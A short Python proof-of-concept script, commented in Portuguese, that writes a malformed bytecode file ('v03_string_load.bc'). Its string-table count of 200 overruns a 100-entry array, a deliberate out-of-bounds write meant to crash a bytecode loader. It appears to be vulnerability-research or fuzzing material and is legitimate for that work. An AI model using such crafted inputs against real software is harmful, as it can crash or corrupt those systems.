import struct

# Cabeçalho: 1 instrução HALT (opcional, crash ocorre antes)
payload = [0] 

# Tabela de Strings maliciosa (200 entradas em uma matriz de 100)
str_count = 200 

with open("v03_string_load.bc", "wb") as f:
    # 1. Bytecode size
    f.write(struct.pack("<I", len(payload)))
    # 2. Bytecode content
    f.write(struct.pack("<I", 0)) # HALT
    
    # 3. String Table (VULNERABILIDADE AQUI)
    f.write(struct.pack("<I", str_count)) 
    for i in range(str_count):
        f.write(b"A" * 100) # Preenche o buffer OOB
    
    # 4. Float Pool count
    f.write(struct.pack("<I", 0))

print("PoC gerada: v03_string_load.bc")